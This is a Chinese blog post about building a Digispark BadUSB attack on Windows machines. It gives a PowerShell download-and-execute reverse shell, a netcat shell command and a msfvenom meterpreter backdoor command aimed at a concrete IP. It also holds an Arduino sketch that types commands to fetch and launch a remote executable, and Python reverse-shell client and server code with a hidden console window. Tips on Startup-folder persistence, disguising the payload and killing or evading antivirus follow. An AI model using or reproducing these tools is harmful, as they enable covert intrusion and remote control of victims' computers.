# windows反弹shell，msf生成后门，绕过杀软以及badusb下

## digispark模拟鼠标操作

先说下之前对鼠标的尝试。一是同时用DigiMouse.h和DigiKeyboard.h编译会报错。。我觉得应该是内存不够的原因。毕竟这个8块钱的小家伙内存小的可怜。。要不就真的是两个库不兼容了，估计就得整俩，一个模拟键盘一个模拟鼠标，靠多头usb线同时接上去，控制好每个指令的时间差，实现鼠标键盘配合使用。（准备再买俩试试，另外还是想试试leonardo...便宜果然还是有便宜的原因的）

为什么要模拟鼠标呢，我觉得模拟鼠标的好处是能解决杀软的问题，既然taskkill关不掉杀软就模拟鼠标来关，或者不关，直接根据杀软捕捉到可以进程弹窗时添加信任区，这是只靠键盘做不到的。

另外个人感觉如果不作为badusb用的话，拿来写点脚本当按键精灵用也挺方便的，比如记录一些常用的指令阿打开一些常用的东西之类的，插上就帮你实现，倒也蛮方便（我是懒狗

然后是单独的用法：

`#include <DigiMouse.h>`引入digispark的鼠标库

`DigiMouse.moveY(10)`像下移动10

`DigiMouse.moveY(-10)`像上移动10

`DigiMouse.moveX(20)`向右移动20

`DigiMouse.moveX(-20)`向左移动20

`DigiMouse.move(X, Y, scroll)`配合使用

`DigiMouse.setButtons(1<<0)`左键按下

`DigiMouse.setButtons(0)`松开所有按键

`DigiMouse.middleClick()`中键点击

`DigiMouse.rightClick()`右键点击

`DigiMouse.leftClick()`左键点击

`DigiMouse.delay(500)`延迟50ms

`DigiMouse.scroll(5)`滚轮向下

要坐标就用之前python那个读取坐标就可


## 反弹shell

windows反弹shell好像都是通过powershell去下载相应powershell脚本并执行来反弹，下面是找到的一个可用的，其余的这里有很多：<a href='https://github.com/samratashok/nishang'>nishang框架传送门</a>

`powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -port 6666`

用上面的脚本就会发现，被杀软拦了，至少我火绒是拦了，其他的没试（不想看杀软内战233333）。


netcat也能弹shell，可惜如果拿到一个普通的windows系统并没有一个简单的按照netcat的方式，且netcat会被杀软拦（md上次打比赛打个nc火绒直接就给我删了

`nc -lvp 端口 -e cmd.exe`连进来就能执行指令了


<img src='https://0xfay.github.io/public/image/004108.jpg'>

还有msf生成的后门之类的，基本上杀软一拦一个准

这时候你就会想有一个鼠标模拟该多好




## msf生成后门

生成后门

`msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=47.112.188.203 lport=9999 -f exe -o ./re.exe`

设置监听

`set payload windows/x64/meterpreter_reverse_tcp`

`set lhost 47.112.188.203`

`set lport 9999`

将后门放到被攻击机上并运行，这边监听就能获得meterpreter会话

我需要的大概就是生成个后门，其余后面的提权包括创建更持久后门呀一些后渗透操作这篇里讲的我觉得算是比较清楚好懂的

https://www.cnblogs.com/diligenceday/p/11028462.html


## 几个方案

### python写后门

虽然上面那个powershell语句下载执行会给警告，警告powershell的可疑行为，但我发现如果分开执行的话好像是没问题的，但是下载那些使用过多的弹shell脚本，会直接被杀掉，我的想法是用python自己编写一个socket服务端与客户端交互执行命令（之前写过），隐藏gui后台运行，再打包封装成exe，，通过badusb下载执行，还可以加个开机自启动。

大致整了一下，代码就不说了，就是创建socket通信然后客户端接收指令并执行

关于powershell下载文件

`$client = new-object System.Net.WebClient`

`$client.DownloadFile('下载地址', '保存地址')`

就将要下载的文件下载到指定地址中

说几个比较特殊的点


pyinstaller本身是自带一个去除windows黑框的选项的

这是pyinstall的参数

1. –noconsole 没有命令框

2. –onefile 一个文件

3. –windowed 隐藏代码

4. -F 选项可以打出一个exe文件，默认是 -D，意思是打成一个文件夹。

5. -w 选项可以打桌面程序，去掉命令行黑框

6. -i 可以设置图标路径，将图标放在根目录：

`pyinstaller -F -w 文件名.py`创建的就是单个不带windows黑框的应用程序

但是我实际测试下来隐藏是隐藏了，我服务端也收到了客户端的连接，但每次执行命令都会报错，执行任何命令都会报错...界面也是隐藏的不好测试到底是哪儿出了问题于是只有换方式。



下面一段代码也可以隐藏python的gui界面，通过调用pywin32库隐藏界面实现后台执行，只有启动时会闪一下

```
import win32api, win32gui   
ct = win32api.GetConsoleTitle()   
hd = win32gui.FindWindow(0,ct)   
win32gui.ShowWindow(hd,0) 
```

打包的时候又会出现问题，打包出来的文件运行会报错：`importError: DLL load failed while importing win32api`。网上搜了一下貌似带有`import pywin32`库和`pyinstaller`的也有点冲突，最终打包代码

`pyinstaller 文件名.py --onefile --hidden-import 缺少的库`我缺win32api就填win32api

打包出来就能使用了



折腾了几天，至少弄出来个可行的。。badusb代码

```
#include <DigiKeyboard.h>
void setup() {
DigiKeyboard.delay(2000);

//open cmd and download shell
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(100);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(100);
DigiKeyboard.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);
DigiKeyboard.print("$client = new-object System.Net.WebClient");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("$client.DownloadFile('http://xxx.xxx.xxx.xxx/py_shellclient_no_GUI.exe', 'D:/py_shellclient.exe')");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

//wait for complete and exit
DigiKeyboard.delay(60000);
DigiKeyboard.delay(60000);
DigiKeyboard.print("exit");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);
DigiKeyboard.print("exit");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);

//open shell.exe
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(100);
DigiKeyboard.print("d:/py_shellclient.exe");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {


}
```

自行修改里面的地址为自己服务器的shell地址，当然我觉得还是有很多不足的地方。

一 是那个2分钟等待时间有点太长了，不仅如此还不能变通。我测试了几次下载时间都在一分半钟左右，shell大小大概10mb，而这个只能模拟键盘不能判断是否下载完成，所以这个两分钟是否合适还是个未知数。

二 是开机启动的问题，看了一下，只要将应用的快捷方式放入以下路径就可以加入开机启动项，且默认启用

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

三 还是这个shell不太完善。倒是不会被查病毒查出来，但是客户端与服务端通讯都是一次性的。准备后续按照聊天室那个模子整个动态多shell连接的服务端。

四 是这样操作的话感觉能做的还是很有限，不如msf方便且解决不了杀软的问题，有什么异常操作该动态拦截还得动态拦截。要么就还是得把功能做全一点，直接一把梭（会不会有几百mb的shell出现233333

五 是隐蔽性的问题，不知道为什么如果改保存路径为c盘的话会报错，就只能下到其他盘，这时候给整些花里胡哨的盘名那就没办法了。还有可以多创点文件夹一层一层的包起来，然后改个正常点的名字，图标也换换，我觉得问题应该不大。

还是把现在的代码发出来

- client---放在被攻击端上

```
from socket import *
from os import *
import win32api, win32gui   
ct = win32api.GetConsoleTitle()   
hd = win32gui.FindWindow(0,ct)   
win32gui.ShowWindow(hd,0) 
#客户端接收执行命令

c=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
c.connect(('127.0.0.1',6666))#连接地址
while True:

    cmd=c.recv(10240)
    cmdstr=cmd.decode()
    if cmdstr=='exit':
        c.close()
        break
    try:
        result=popen(cmdstr).read()
        if result == '':
            result='[-] ERROR_COMMAND'
    except:
        result='[-] ERROR_COMMAND'
    c.send(result.encode())

```

- server---放服务器上接收shell

```
from socket import *
from os import *

#服务端发送命令

s=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
s.bind(('',6666))#绑定端口
s.listen(1)#开始监听一个队列
while True:
    sock,addr=s.accept()#返回两次 第一次返回连接地址 二 端口号
    print ('客户端：',addr)
    while True:

        code=input('[+] cmd >>:')
        sock.send(code.encode())
        if code=='exit':
            s.close()
            break
        result=sock.recv(10240)
        print(result.decode())


s.close()
```


### msf免杀

难搞，通过编码的msf后门好像已经8行了，有几个基于msf的免杀工具，还在尝试中

### Antivirus_R3_bypass

主要是这篇文章

https://www.freebuf.com/vuls/220997.html

了解了一下杀软不能taskkill的原理（虽然逆向不怎么懂所以不是很看得懂

我也不概述了写那篇文章的师傅描述的非常清楚了。（我自己还是有点测不来）

我的思路如果是利用这个的话就先下bypass把杀软全关了，然后就直接传msf🐎起飞（windows defence好像不拦msf的🐎，直接芜湖~)

### 配合模拟鼠标用

配合模拟鼠标解决杀软的拦截，不过我觉得稍微有点难实现，分辨率不同，不同电脑，不同杀软，都有可能让点击坐标不同。到时候再试试

### 其他

一些免杀方法像加免杀壳呀之类的绕过杀软。。都跟逆向有关系（逆向基础为0）就没有深究了。


